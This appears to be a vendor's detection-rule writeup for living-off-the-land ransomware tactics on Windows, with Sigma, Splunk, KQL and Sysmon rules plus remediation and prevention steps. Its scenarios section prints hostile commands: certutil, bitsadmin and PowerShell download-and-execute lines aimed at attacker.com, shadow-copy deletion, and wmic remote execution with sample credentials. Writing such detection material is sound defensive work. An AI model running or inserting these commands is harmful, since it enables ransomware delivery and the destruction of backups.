# dugganusa-012: Living-off-the-Land Ransomware Tactics

**Category:** Ransomware Defense
**Severity:** High
**False Positive Rate:** Medium (15-20%)
**MITRE ATT&CK:** T1218 (System Binary Proxy Execution), T1059 (Command and Scripting Interpreter)

## Overview

Detects ransomware using Living-off-the-Land (LOTL) techniques—abusing legitimate Windows binaries (`certutil`, `bitsadmin`, `wmic`, `powershell`) for malicious activity. Ransomware gangs use built-in tools to evade detection and avoid dropping custom malware.

## The Problem

**Why LOTL Works:**
1. **Legitimate Binaries:** Signed by Microsoft, trusted by Windows
2. **Pre-installed:** No need to drop custom tools (evades file-based detection)
3. **EDR Blindspots:** Security tools trust certutil.exe, powershell.exe
4. **Dual-Use:** Same tools used by admins AND attackers

**Common LOTL Binaries (LOLBins):**
- **certutil.exe** - Certificate utility → Download payloads, decode files
- **bitsadmin.exe** - Background transfer → Persistence, C2 communication
- **wmic.exe** - Windows Management → Remote execution, lateral movement
- **powershell.exe** - Scripting → Everything (download, execute, encrypt, exfiltrate)

## Detection Logic

**Triggers on suspicious command-line arguments:**

**Certutil Abuse:**
- `-urlcache` (download files from URLs)
- `-decode` / `-decodehex` (decode payloads)
- `split` (split/reconstruct files to evade AV)

**BITSAdmin Abuse:**
- `/transfer` (download files)
- `/create` / `/addfile` (create background jobs)

**WMIC Abuse:**
- `process call create` (remote execution)
- `shadowcopy delete` (delete backups before encryption)

**PowerShell Abuse:**
- `-enc` / `-encodedcommand` (obfuscated commands)
- `Invoke-WebRequest` / `DownloadFile` (download payloads)
- `IEX` (Invoke-Expression - execute downloaded code)

**Sigma Rule:**

```yaml
title: Living-off-the-Land Ransomware Tactics
id: dugganusa-012-lotl-ransomware
status: production
description: Ransomware using legitimate Windows binaries for malicious activity
author: DugganUSA LLC
date: 2025-11-19
references:
    - https://lolbas-project.github.io/
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1218
    - attack.t1059
logsource:
    product: windows
    category: process_creation
detection:
    selection_certutil:
        Image|endswith: '\\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-decodehex'
            - 'split'
    selection_bitsadmin:
        Image|endswith: '\\bitsadmin.exe'
        CommandLine|contains:
            - '/transfer'
            - '/create'
            - '/addfile'
    selection_wmic:
        Image|endswith: '\\wmic.exe'
        CommandLine|contains:
            - 'process call create'
            - 'shadowcopy delete'
    selection_powershell:
        Image|endswith:
            - '\\powershell.exe'
            - '\\pwsh.exe'
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
            - 'Invoke-WebRequest'
            - 'DownloadFile'
            - 'IEX'
    condition: selection_certutil or selection_bitsadmin or selection_wmic or selection_powershell
fields:
    - CommandLine
    - ParentImage
    - User
    - ComputerName
falsepositives:
    - Legitimate administrative scripts
    - Software updates
    - IT automation
level: high
```

## SIEM Implementations

### Splunk SPL

```spl
index=windows EventCode=4688 OR EventCode=1
| where match(Image, "(?i)(certutil\\.exe|bitsadmin\\.exe|wmic\\.exe|powershell\\.exe|pwsh\\.exe)")
| where match(CommandLine, "(?i)(-urlcache|-decode|-decodehex|split|/transfer|/create|/addfile|process call create|shadowcopy delete|-enc|-encodedcommand|Invoke-WebRequest|DownloadFile|IEX)")
| eval lolbin_type=case(
    match(Image, "certutil"), "Certutil - File Download/Decode",
    match(Image, "bitsadmin"), "BITSAdmin - Background Transfer",
    match(Image, "wmic"), "WMIC - Remote Execution",
    match(Image, "powershell"), "PowerShell - Encoded Commands",
    1=1, "Unknown LOLBin"
  )
| eval risk_score=case(
    match(CommandLine, "shadowcopy delete"), 95,
    match(CommandLine, "-enc"), 85,
    match(CommandLine, "urlcache"), 75,
    1=1, 60
  )
| where risk_score >= 60
| stats count by ComputerName, Image, lolbin_type, CommandLine, ParentImage, User, risk_score
| eval severity="HIGH"
| eval mitre="T1218 + T1059"
| eval action=case(
    risk_score >= 90, "ISOLATE + IR",
    risk_score >= 75, "ALERT + INVESTIGATE",
    1=1, "MONITOR"
  )
| table ComputerName, lolbin_type, CommandLine, User, risk_score, action, count
| sort -risk_score
```

### KQL (Azure Sentinel / Microsoft Defender)

```kql
// Living-off-the-Land Ransomware Tactics Detection
let LOLBins = dynamic(["certutil.exe", "bitsadmin.exe", "wmic.exe", "powershell.exe", "pwsh.exe"]);
let SuspiciousArgs = dynamic([
    "-urlcache", "-decode", "-decodehex", "split",
    "/transfer", "/create", "/addfile",
    "process call create", "shadowcopy delete",
    "-enc", "-encodedcommand", "Invoke-WebRequest", "DownloadFile", "IEX"
]);
DeviceProcessEvents
| where FileName has_any (LOLBins)
| where ProcessCommandLine has_any (SuspiciousArgs)
| extend LOLBinType = case(
    FileName has "certutil", "Certutil - File Download/Decode",
    FileName has "bitsadmin", "BITSAdmin - Background Transfer",
    FileName has "wmic", "WMIC - Remote Execution",
    FileName has "powershell" or FileName has "pwsh", "PowerShell - Encoded Commands",
    "Unknown LOLBin"
  )
| extend RiskScore = case(
    ProcessCommandLine has "shadowcopy delete", 95,
    ProcessCommandLine has "-enc" or ProcessCommandLine has "-encodedcommand", 85,
    ProcessCommandLine has "urlcache" or ProcessCommandLine has "DownloadFile", 75,
    60
  )
| where RiskScore >= 60
| summarize
    ExecutionCount=count(),
    FirstSeen=min(TimeGenerated),
    LastSeen=max(TimeGenerated)
  by DeviceName, FileName, LOLBinType, ProcessCommandLine, InitiatingProcessFileName, AccountName, RiskScore
| extend Action = case(
    RiskScore >= 90, "ISOLATE + IR",
    RiskScore >= 75, "ALERT + INVESTIGATE",
    "MONITOR"
  )
| extend Severity = "High"
| extend MITRE = "T1218 + T1059"
| sort by RiskScore desc
```

## Example Attack Scenarios

### Scenario 1: Certutil - Ransomware Download

```cmd
certutil.exe -urlcache -split -f http://attacker.com/ransomware.exe C:\Windows\Temp\update.exe
```

**What it does:**
- `-urlcache`: Use URL cache to download file
- `-split`: Split download to evade size-based detection
- `-f`: Force overwrite existing file

**Why EDR misses:** Legitimate admins use certutil to download certificates

**Risk Score:** 75 (High)

### Scenario 2: BITSAdmin - Persistent C2

```cmd
bitsadmin /transfer "WindowsUpdate" /download /priority HIGH http://attacker.com/payload.exe C:\ProgramData\payload.exe
```

**What it does:**
- Creates BITS job named "WindowsUpdate" (blends in)
- Downloads payload in background
- Survives reboots (BITS job persistence)

**Why EDR misses:** Windows Update uses BITS legitimately

**Risk Score:** 75 (High)

### Scenario 3: WMIC - Shadow Copy Deletion (PRE-ENCRYPTION)

```cmd
wmic shadowcopy delete /nointeractive
```

**What it does:**
- Deletes ALL Volume Shadow Copies (backups)
- `/nointeractive`: No user prompts
- Prevents file recovery after encryption

**Why this is CRITICAL:** Shadow copy deletion = ransomware about to deploy

**Risk Score:** 95 (ISOLATE IMMEDIATELY)

### Scenario 4: PowerShell - Encoded Ransomware Deployment

```cmd
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_BLOB>
```

**Decoded command:**
```powershell
$client = New-Object System.Net.WebClient
$url = "http://attacker.com/ransomware.ps1"
$file = "$env:TEMP\ransom.ps1"
$client.DownloadFile($url, $file)
IEX (Get-Content $file -Raw)
```

**Why EDR misses:** PowerShell is everywhere, base64 hides payload

**Risk Score:** 85 (High - Alert + Investigate)

### Scenario 5: WMIC - Lateral Movement

```cmd
wmic /node:192.168.1.50 /user:DOMAIN\Admin /password:P@ssw0rd process call create "cmd.exe /c powershell.exe -enc <PAYLOAD>"
```

**What it does:**
- Remote execution on 192.168.1.50
- Uses stolen admin credentials
- Deploys ransomware across network

**Why EDR misses:** WMIC used for legitimate remote admin

**Risk Score:** 90 (Isolate + IR)

## False Positives

**Moderate false positive rate (15-20%) due to:**

1. **Legitimate Admin Scripts:**
   - Certutil for certificate management
   - BITS for Windows Update / SCCM deployments
   - WMIC for remote management
   - PowerShell for automation

2. **Software Updates:**
   - Application installers using BITS
   - Vendor scripts using PowerShell

3. **IT Automation:**
   - SCCM/Intune deployments
   - Group Policy scripts

**Mitigation Strategies:**

```powershell
# Whitelist known good scripts by hash
$KnownGoodScripts = @(
    "C:\IT\Automation\BackupScript.ps1",
    "C:\Program Files\Vendor\Update.ps1"
)

# Exclude SCCM servers
$SCCMServers = @("SCCM01", "SCCM02")

# Exclude service accounts
$ServiceAccounts = @("DOMAIN\svc_backup", "DOMAIN\svc_monitoring")
```

**Tuning Recommendations:**
- **Whitelist by ParentImage:** Exclude SCCM/Intune processes
- **User Context:** Admin accounts vs. regular users
- **Time-based:** Unusual hours (2 AM PowerShell execution = suspicious)
- **Frequency:** certutil used 100 times in 1 minute = automated attack

## Remediation

**Response by Risk Score:**

### Risk Score 95: ISOLATE + IR (Shadow Copy Deletion)

```powershell
# IMMEDIATE ISOLATION
Disable-NetAdapter -Name "*" -Confirm:$false

# Kill suspicious processes
Get-Process -Name wmic, certutil, bitsadmin, powershell | Stop-Process -Force

# Activate Incident Response
# Assume ransomware deployment imminent
# Restore from backups if encryption occurs
```

### Risk Score 85-90: ALERT + INVESTIGATE

```powershell
# Review process tree
Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational | Where-Object {
  $_.Id -eq 1 -and $_.Message -match "(certutil|bitsadmin|wmic|powershell)"
}

# Check for downloaded files
Get-ChildItem -Path C:\Users\*\AppData\Local\Temp -Recurse -File | Where-Object {
  $_.CreationTime -gt (Get-Date).AddHours(-1)
}

# Inspect BITS jobs
bitsadmin /list /allusers /verbose
```

### Risk Score 60-75: MONITOR

- Log for correlation with other indicators
- Check if user has legitimate reason for action
- Escalate if repeated behavior

## Prevention

**1. Application Whitelisting (WDAC)**

```xml
<!-- Block certutil/bitsadmin/wmic for non-admins -->
<FileRuleRef RuleID="ID_DENY_CERTUTIL" />
<FileRuleRef RuleID="ID_DENY_BITSADMIN" />
<FileRuleRef RuleID="ID_DENY_WMIC" />
```

**2. PowerShell Constrained Language Mode**

```powershell
# Force PowerShell into Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

**3. Attack Surface Reduction Rules (Defender)**

```powershell
# Block Office from creating child processes
Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled

# Block persistence through WMI
Add-MpPreference -AttackSurfaceReductionRules_Ids E6DB77E5-3DF2-4CF1-B95A-636979351E5B -AttackSurfaceReductionRules_Actions Enabled
```

**4. Sysmon Logging**

```xml
<!-- Sysmon rule for LOLBin process creation -->
<RuleGroup name="LOLBin Detection" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="end with">certutil.exe</Image>
    <Image condition="end with">bitsadmin.exe</Image>
    <Image condition="end with">wmic.exe</Image>
    <CommandLine condition="contains">-urlcache</CommandLine>
    <CommandLine condition="contains">shadowcopy delete</CommandLine>
    <CommandLine condition="contains">-enc</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

## References

- **LOLBAS Project:** https://lolbas-project.github.io/
- **MITRE ATT&CK T1218:** https://attack.mitre.org/techniques/T1218/
- **MITRE ATT&CK T1059:** https://attack.mitre.org/techniques/T1059/

## Attribution

**Research:** LOLBAS Project, Microsoft Security
**Implementation:** DugganUSA LLC
**License:** Free for non-commercial use. Commercial use requires attribution.

---

**Democratic Sharing Law** - Microsoft won't remove certutil.exe. We can detect certutil.exe abuse. Free detection levels the playing field.
